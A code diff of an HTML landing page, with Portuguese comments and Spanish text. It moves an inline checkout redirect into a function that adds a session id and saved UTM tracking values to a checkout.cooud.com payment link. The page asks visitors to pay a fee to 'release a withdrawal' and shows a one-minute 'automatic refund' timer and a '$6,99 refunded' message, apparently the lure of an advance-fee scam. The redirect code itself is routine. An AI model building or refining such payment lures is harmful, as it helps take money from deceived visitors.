@@ -91,6 +91,9 @@
   ============================================
 -->
 
+<!-- Exemplo de botão que passa o session_id para o checkout -->
+<button onclick="irParaCheckout()">Comprar agora</button>
+
 <script>
 function irParaCheckout() {
   var sid = window._sid || '';
@@ -1600,27 +1603,40 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             </div>
           </div>
 
-          <!-- Call to Action -->
-          <div class="confirmation-section">
-			<button onclick="
-			  const params = new URLSearchParams(window.location.search);
-			  const sessionId = window._trackingSessionId || localStorage.getItem('_sid') || '';
-			  params.set('sid', sessionId);
-			  window.location.href = 'https://checkout.cooud.com/01KNYEVHM17EDHH7HVSD82WKFW?' + params.toString();
-			  return false;
-			" class="confirmation-cta-button" id="confirmation-button">
-			  Pagar tarifa para Liberar Retiro
-			</button>
-              
-            <div class="confirmation-timer">
-              ⏱️ Reembolso automático en 1 minuto
-            </div>
-            <div class="confirmation-success-message" id="confirmation-success-message">
-              ✅ Identidad confirmada.
-              <span id="confirmation-success-value">$6,99</span> reembolsados
-              y retiro liberado.
-            </div>
-          </div>
+		<div class="confirmation-section">
+		  <button onclick="irParaCheckoutCooud()" class="confirmation-cta-button" id="confirmation-button">
+		    Pagar tarifa para Liberar Retiro
+		  </button>
+		    
+		  <div class="confirmation-timer">
+		    ⏱️ Reembolso automático en 1 minuto
+		  </div>
+		  <div class="confirmation-success-message" id="confirmation-success-message">
+		    ✅ Identidad confirmada.
+		    <span id="confirmation-success-value">$6,99</span> reembolsados
+		    y retiro liberado.
+		  </div>
+		</div>
+		
+		<script>
+		// Essa função faz a mágica de levar as UTMs e o SID para o checkout
+		function irParaCheckoutCooud() {
+		  var sid = window._sid || localStorage.getItem('_sid') || '';
+		  var checkoutUrl = 'https://checkout.cooud.com/01KNYEVHM17EDHH7HVSD82WKFW';
+		  
+		  var params = new URLSearchParams();
+		  params.set('sid', sid);
+		
+		  // Pega as UTMs que o script do <head> salvou
+		  const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+		  utmKeys.forEach(function(key) {
+		    var value = localStorage.getItem(key);
+		    if (value) params.set(key, value);
+		  });
+		
+		  window.location.href = checkoutUrl + '?' + params.toString();
+		}
+		</script>
 
           <!-- Segurança -->
           <div class="confirmation-security-grid">
